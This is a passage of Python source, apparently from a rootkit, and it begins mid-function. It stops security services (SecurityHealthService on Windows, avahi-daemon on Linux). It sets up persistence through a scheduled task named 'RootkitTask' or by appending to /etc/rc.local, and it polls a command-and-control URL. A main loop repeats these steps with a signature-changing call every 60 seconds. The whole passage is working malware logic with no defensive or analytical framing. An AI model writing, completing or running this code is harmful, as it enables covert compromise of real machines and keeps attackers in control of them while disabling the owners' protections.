        if os.name == 'nt':  # Windows
            subprocess.run(['sc', 'stop', 'SecurityHealthService'])
        else:  # Linux
            subprocess.run(['service', 'avahi-daemon', 'stop'])
    
    # Step 4: Establish persistence
    def establish_persistence():
        if os.name == 'nt':  # Windows
            subprocess.run(['schtasks', '/create', '/tn', 'RootkitTask', '/tr', rootkit_path, '/sc', 'daily', '/st', '00:00'])
        else:  # Linux
            with open('/etc/rc.local', 'a') as f:
                f.write(f'\n{rootkit_path}\n')
    
    # Step 5: Communicate with C2 server
    def communicate_with_c2():
        try:
            response = requests.get(c2_url)
            print(f'C2 Response: {response.text}')
        except requests.RequestException as e:
            print(f'C2 Communication Error: {e}')
    
    # Main loop
    while True:
        change_signature()
        disable_security_software()
        establish_persistence()
        communicate_with_c2()
        time.sleep(60)  # Wait for 60 seconds before repeating
